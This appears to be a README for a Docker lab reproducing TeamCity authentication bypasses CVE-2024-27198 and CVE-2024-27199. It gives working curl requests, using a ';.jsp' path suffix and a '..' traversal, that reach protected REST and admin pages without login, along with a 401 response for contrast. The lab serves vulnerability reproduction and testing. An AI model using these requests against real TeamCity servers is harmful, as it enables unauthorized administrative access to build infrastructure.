# TeamCity On-Premises (CVE-2024-27198 and CVE-2024-27199)

> Advisory https://blog.jetbrains.com/teamcity/2024/03/additional-critical-security-issues-affecting-teamcity-on-premises-cve-2024-27198-and-cve-2024-27199-update-to-2023-11-4-now

> Analysis https://blog.rapid7.com/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/

## Usage

Starup with,

```bash
docker compose up
```

access `http://localhost:8112` and create a admin account.

### CVE-2024-27198

Bypass with `jsp` parameter

```bash
curl -ik http://localhost:8112/hax?jsp=/app/rest/server;.jsp
```

### CVE-2024-2719

Normally, we need authroization to accessing `/admin/diagnostic.jsp`,

```bash
curl -ik --path-as-is http://localhost:8112/admin/diagnostic.jsp
HTTP/1.1 401
TeamCity-Node-Id: MAIN_SERVER
WWW-Authenticate: Basic realm="TeamCity"
WWW-Authenticate: Bearer realm="TeamCity"
Cache-Control: no-store
Content-Type: text/plain;charset=UTF-8
Transfer-Encoding: chunked
Date: Wed, 06 Mar 2024 04:19:52 GMT

Authentication required
To login manually go to "/login.html" page
```

it can be bypass with `..`

```bash
curl -ik --path-as-is http://localhost:8112/res/../admin/diagnostic.jsp
```